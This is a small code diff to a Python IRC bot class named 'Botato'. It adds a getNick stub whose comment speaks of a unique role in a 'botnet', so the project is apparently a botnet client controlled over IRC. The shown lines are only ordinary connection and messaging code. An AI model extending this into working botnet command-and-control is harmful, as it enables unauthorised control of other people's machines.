@@ -47,6 +47,7 @@ class IRC(object):
 		self.send("USER "+IRC.prefix+" \"\" \"\" :Botato\r\n")
 		self.send("NICK "+IRC.prefix+"\r\n")
 		self.send("JOIN "+self.channel+"\r\n")
+		self.nick=self.getNick()
 	
 	def startListening(self):
 		self.nowlistening=True
@@ -63,3 +64,6 @@ class IRC(object):
 				self.send(line[1])
 			else:
 				self.send("PRIVMSG "+self.channel+" :"+line)
+				
+	def getNick(self): #TODO - Get valid serialized nick for unique role in botnet
+		return IRC.prefix
